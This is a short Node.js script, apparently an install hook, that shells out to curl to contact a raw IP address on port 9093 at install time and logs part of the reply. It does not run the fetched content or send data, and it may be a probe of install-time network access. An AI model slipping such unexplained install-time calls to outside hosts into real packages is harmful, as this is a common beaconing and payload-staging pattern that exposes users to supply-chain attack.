// Install-time fetch for endpoint /3
import { execSync } from "node:child_process";

console.log("⏳ [Install /3] Fetching http://159.65.66.91:9093/3...");

try {
  const output = execSync("curl -s http://159.65.66.91:9093/3", {
    encoding: "utf-8",
    timeout: 10000,
  });
  console.log("✅ [Install /3] Response:", output.substring(0, 100));
} catch (error) {
  console.log("⚠️ [Install /3] Failed");
}
